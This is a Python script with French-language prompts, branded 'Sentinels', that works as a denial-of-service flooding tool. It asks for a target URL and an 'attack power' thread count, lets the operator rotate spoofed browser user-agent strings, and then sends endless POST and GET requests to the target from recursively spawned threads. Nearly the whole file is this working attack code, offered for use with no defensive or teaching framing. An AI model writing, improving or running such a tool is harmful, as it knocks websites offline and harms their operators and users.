import requests
import threading
import time
import sys
import os
import random
import progressbar
from colorama import init
from colorama import Fore, Back, Style
from threading import Thread
from sys import stdout
from time import sleep
from colorama import Fore, Style
from pystyle import *

init()

ascii = '''
  ██████ ▓█████  ███▄    █ ▄▄▄█████▓ ██▓ ███▄    █ ▓█████  ██▓      ██████ 
▒██    ▒ ▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██▒    ▒██    ▒ 
░ ▓██▄   ▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██▒▓██  ▀█ ██▒▒███   ▒██░    ░ ▓██▄   
  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██░      ▒   ██▒
▒██████▒▒░▒████▒▒██░   ▓██░  ▒██▒ ░ ░██░▒██░   ▓██░░▒████▒░██████▒▒██████▒▒
▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░    ░     ▒ ░░ ░░   ░ ▒░ ░ ░  ░░ ░ ▒  ░░ ░▒  ░ ░
░  ░  ░     ░      ░   ░ ░   ░       ▒ ░   ░   ░ ░    ░     ░ ░   ░  ░  ░  
      ░     ░  ░         ░           ░           ░    ░  ░    ░  ░      ░  '''[1:]

System.Clear()
System.Title("Sentinels")
print("\n"*2)
print(Colorate.Horizontal(Colors.red_to_black, Center.XCenter(ascii)))
print("\n"*2)

print(Style.BRIGHT + Fore.RED)
bar = progressbar.ProgressBar(maxval=10.0, widgets=[
	' Lancement... ',
	progressbar.Bar(left='| ', marker='█', right=' | '),
	progressbar.SimpleProgress(),
]).start()

t = 0.0
while t <= 10.0:
	bar.update(t)
	time.sleep(0.02)
	t += 0.1
bar.finish()

user_agent = None
user_agent_one_random = None

os.system('cls')

System.Clear()
print("\n"*2)
print(Colorate.Horizontal(Colors.red_to_black, Center.XCenter(ascii)))
print("\n"*2)
a = 0
url = None
url_check_status = None
time_print = 1
thrnom = None
url = input(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "?" + Fore.WHITE + "]" + Fore.RED + " URL >> " + Fore.RESET)
try:
	requests.get(url)
except requests.exceptions.InvalidURL:
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " L'URL " + Fore.WHITE + str(url) + Fore.RED + " n'éxiste pas." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()


except requests.exceptions.MissingSchema:
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " L'URL " + Fore.WHITE + str(url) + Fore.RED + " n'éxiste pas." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()



except requests.exceptions.ConnectionError:
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " L'URL " + Fore.WHITE + str(url) + Fore.RED + " n'éxiste pas." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()



if not url.__contains__("http"):
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " L'URL " + Fore.WHITE + str(url) + Fore.RED + " n'utilise pas le bon domaine." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()



elif not url.__contains__("."):
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " L'URL " + Fore.WHITE + str(url) + Fore.RED + " n'utilise pas le bon domaine." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()

print("\n")
thrnom = input(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "?" + Fore.WHITE + "]" + Fore.RED + " Puissance de l'attaque (exemple: 1000) >> " + Fore.RESET)

if thrnom == "0":
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + " [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " La puissance de l'attaque ne peut pas être nulle." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()


elif thrnom == "":
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " La puissance de l'attaque ne peut pas être nulle." + Fore.RESET)
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()

print()
print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "1" + Fore.WHITE + "]" + Fore.RED + " 1 seule user-agent pour tout les cycles" + Fore.RESET)
print(Fore.WHITE + Style.BRIGHT + " [" + Fore.RED + "2" + Fore.WHITE + "]" + Fore.RED + " Changer d'user-agent pendant les cycles" + Fore.RESET)
mode_ask = input(Fore.RED + Style.BRIGHT + " >> " + Fore.RESET)

if mode_ask == "1":
	print("")
elif mode_ask == "2":
	print("")

else:
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " La réponse n'est pas correcte." )
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()

print (Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "1" + Fore.WHITE + "]" + Fore.RED + " Lancer l'attaque DDoS" + Fore.RESET)
print (Fore.WHITE + Style.BRIGHT + " [" + Fore.RED + "2" + Fore.WHITE + "]" + Fore.RED + " Annuler" + Fore.RESET)
ask_for_start = input(Fore.RED + Style.BRIGHT + " >> " + Fore.RESET)


def ddos_mode1():
	headers = { "User-Agent": user_agent_one_random }
	while(1<10):
		try:
			spam = requests.post(url=url, headers=headers)
			spam2 = requests.get(url=url, headers=headers)
			for i in range(int(thrnom)):
				thr = Thread(target = ddos_mode1, daemon=True)
				thr.start()
				url_check_status = requests.get(url=url, headers=headers)
				print(" " + Fore.RED + Style.BRIGHT + " \nStatut: " + str(url_check_status))
				time.sleep(1)

		except:
			continue

def ddos_mode2():
	user_agent_for_mode2 = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
			  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
			  'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
			  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0',
			  'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1',
			  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
			  'Mozilla/5.0 (X11; Linux amd64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35',
			  'Mozilla/5.0 (X11; CrOS i686 0.13.507) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/13.0.763.0 Safari/534.35',
			  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.33 (KHTML, like Gecko) Ubuntu/9.10 Chromium/13.0.752.0 Chrome/13.0.752.0 Safari/534.33',
			  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31',
			  'Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30',
			  'Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
			  'Mozilla/5.0 (X11; CrOS i686 12.0.742.91) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
			  'Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko)',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7',
			  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5',
			  'Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
			  'Mozilla/4.0 (compatible; MSIE 5.01; AOL 4.0; Windows 98)',
			  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98)',
			  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 95)',
			  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K)',
			  'Mozilla/5.0 (X11; Linux i686; U; rv:1.7) Gecko/0 Kazehakase/0.4.3',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20060216 Kazehakase/0.4.2',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070224 Kazehakase/0.3.9',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20050923 Kazehakase/0.3.9',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.9',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20060717 Kazehakase/0.3.8 Debian/0.3.8-2',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.8',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.5',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20051128 Kazehakase/0.3.3 Debian/0.3.3-1',
			  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.1',
			   ]
	headers = { "User-Agent": random.choice(user_agent_for_mode2) }
	while(1<10):
		try:
			spam = requests.post(url=url, headers=headers)
			spam2 = requests.get(url=url, headers=headers)
			for i in range(int(thrnom)):
				thr = Thread(target = ddos_mode2, daemon=True)
				thr.start()
				url_check_status = requests.get(url=url, headers=headers)
				print(" " + Fore.RED + Style.BRIGHT + " \nStatut: " + str(url_check_status))
				time.sleep(1)

		except:
			continue

def starter_ddos():
	global user_agent_one_random
	global time_print
	if mode_ask == "1":
		user_agent_for_mode1 = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
				  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
				  'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
				  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
				  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
				  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
				  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
				  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
				  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
				  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)',
				  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0',
				  'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1',
				  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
				  'Mozilla/5.0 (X11; Linux amd64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36',
				  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35',
				  'Mozilla/5.0 (X11; CrOS i686 0.13.507) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/13.0.763.0 Safari/534.35',
				  'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.33 (KHTML, like Gecko) Ubuntu/9.10 Chromium/13.0.752.0 Chrome/13.0.752.0 Safari/534.33',
				  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31',
				  'Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30',
				  'Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
				  'Mozilla/5.0 (X11; CrOS i686 12.0.742.91) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
				  'Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko)',
				  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8',
				  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7',
				  'Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5',
				  'Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
				  'Mozilla/4.0 (compatible; MSIE 5.01; AOL 4.0; Windows 98)',
				  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 98)',
				  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Windows 95)',
				  'Mozilla/4.0 (compatible; MSIE 4.01; AOL 4.0; Mac_68K)',
				  'Mozilla/5.0 (X11; Linux i686; U; rv:1.7) Gecko/0 Kazehakase/0.4.3',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20060216 Kazehakase/0.4.2',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070224 Kazehakase/0.3.9',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20050923 Kazehakase/0.3.9',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.9',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20060717 Kazehakase/0.3.8 Debian/0.3.8-2',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.8',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.5',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/20051128 Kazehakase/0.3.3 Debian/0.3.3-1',
				  'Mozilla/5.0 (X11; Linux i686; U;) Gecko/0 Kazehakase/0.3.1',
				   ]
		user_agent_one_random = random.choice(user_agent_for_mode1)
		ddos_mode1()

	elif mode_ask == "2":
		ddos_mode2()

if ask_for_start == "2":
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + " [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " Vous avez annuler l'attaque DDoS." + Fore.RESET )
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()

elif ask_for_start == "1":
	starter_ddos()

elif ask_for_start == "2":
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + " [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " Vous avez annuler l'attaque DDoS." + Fore.RESET )
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()
elif ask_for_start == "1":
	starter_ddos()

elif ask_for_start == "2":
	print(Style.NORMAL)
	print(Fore.WHITE + Style.BRIGHT + " [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " Vous avez annuler l'attaque DDoS." + Fore.RESET )
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()
elif ask_for_start == "1":
	starter_ddos()

else:
	print(Fore.WHITE + Style.BRIGHT + "\n [" + Fore.RED + "!" + Fore.WHITE + "]" + Fore.RED + " La réponse n'est pas correcte." )
	bar = progressbar.ProgressBar(maxval=10.0, widgets=[
		'Fermeture... ',
		progressbar.Bar(left='[', marker='█', right=']'),
		progressbar.SimpleProgress(),
	]).start()
	 
	t = 0.0
	while t <= 10.0:
		bar.update(t)
		time.sleep(0.02)
		t += 0.1
	bar.finish()

	sys.exit()